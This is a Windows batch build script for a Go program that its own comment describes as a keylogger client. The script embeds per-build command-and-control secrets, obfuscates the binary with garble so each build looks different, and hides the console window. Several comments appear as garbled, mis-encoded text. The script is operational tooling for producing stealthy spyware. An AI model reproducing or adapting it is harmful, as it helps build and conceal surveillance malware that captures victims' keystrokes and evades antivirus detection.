@echo off
rem Agent (keylogger client) build script.
rem
rem ����:
rem   1. ����ͼ������Դ(�汾��Ϣ/�嵥/ͼ��),���� resource.syso;
rem   2. ����װ garble,ʹ�� -tiny -seed=random ��������(�������,
rem      ÿ�ι���ָ�Ʋ�ͬ;����/��ʶ������,�����С;�����ַ�������
rem      Դ���� XOR ��������,���� -literals �Ķ����������);
rem      ���������ͨ go build;
rem   3. ȥ������/������Ϣ,�޿���̨���ڡ�
setlocal
cd /d "%~dp0"

set LDFLAGS=-s -w -H windowsgui

echo [*] ����ͼ������Դ�ļ�
go run gen_icon.go
if errorlevel 1 goto :fail
go run gen_resources.go
if errorlevel 1 goto :fail

echo [*] Generate embedded C2 secret data (unique key per build)
go run ./tools/secretgen
if errorlevel 1 goto :fail

where garble >nul 2>nul
if %errorlevel%==0 (
    echo [*] Using garble build: -tiny -seed=random -literals %LDFLAGS%
    garble -tiny -seed=random -literals build -ldflags "%LDFLAGS%" -o golin.exe .
    if errorlevel 1 goto :fail
) else (
    echo [*] garble not found, using plain go build: %LDFLAGS%
    go build -trimpath -ldflags "%LDFLAGS%" -o golin.exe .
    if errorlevel 1 goto :fail
)

if exist golin.exe (
    for %%A in (golin.exe) do echo [*] Build OK: %%A  %%~zA bytes  %%~tA
) else (
    echo [-] Build FAILED, golin.exe not produced
    goto :fail
)

echo.
pause
exit /b 0

:fail
echo [-] ����ʧ��,�����Ϸ��������
echo.
pause
exit /b 1
endlocal
